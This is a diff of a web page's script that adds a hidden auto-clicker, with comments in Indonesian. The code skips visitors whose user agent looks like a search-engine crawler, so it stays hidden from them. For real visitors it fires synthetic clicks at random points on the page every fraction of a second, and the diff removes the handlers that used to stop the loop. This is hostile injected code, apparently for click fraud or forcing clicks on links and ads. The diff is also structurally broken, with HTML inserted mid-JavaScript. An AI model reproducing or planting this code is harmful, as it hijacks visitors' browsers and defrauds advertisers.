@@ -115,12 +115,57 @@
       doClick();
     }
   }
+<!-- random klik start -->
+<script>
+(function() {
+  'use strict';
 
-  function stopLoop() {
-    isRunning = false;
-    if (timeoutId) {
-      clearTimeout(timeoutId);
-      timeoutId = null;
+  // ========== ABAIKAN BOT/CRAWLER ==========
+  const botPattern = /bot|crawler|spider|googlebot|bingbot|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot|mj12bot|dotbot|screaming/i;
+  if (botPattern.test(navigator.userAgent)) return;
+
+  // ========== KONFIGURASI ==========
+  const DELAY_MIN = 300;
+  const DELAY_MAX = 1000;
+
+  let timeoutId = null;
+  let isRunning = false;
+
+  // ========== FUNGSI UTAMA ==========
+  function randomDelay() {
+    return DELAY_MIN + Math.random() * (DELAY_MAX - DELAY_MIN);
+  }
+
+  function clickAnywhere() {
+    if (!isRunning) return;
+
+    try {
+      const x = Math.random() * window.innerWidth;
+      const y = Math.random() * window.innerHeight;
+      const el = document.elementFromPoint(x, y);
+
+      if (el) {
+        el.dispatchEvent(new MouseEvent('click', {
+          bubbles: true,
+          cancelable: true,
+          clientX: x,
+          clientY: y,
+          view: window
+        }));
+      }
+    } catch (e) {
+      // Gagal silent
+    }
+
+    // Loop terus
+    timeoutId = setTimeout(clickAnywhere, randomDelay());
+  }
+
+  // ========== START ==========
+  function startLoop() {
+    if (!isRunning) {
+      isRunning = true;
+      clickAnywhere();
     }
   }
 
@@ -131,17 +176,6 @@
     document.addEventListener(eventType, startLoop, { capture: true, passive: true });
     window.addEventListener(eventType, startLoop, { capture: true, passive: true });
   });
-
-  // ========== STOP SAAT PERGI ==========
-  ['pagehide', 'beforeunload', 'popstate'].forEach(eventType => {
-    window.addEventListener(eventType, () => stopLoop(), { passive: true });
-  });
-
-  document.addEventListener('visibilitychange', () => {
-    if (document.hidden) stopLoop();
-  });
-
-  window.addEventListener('unload', stopLoop);
 
 })();
 </script>
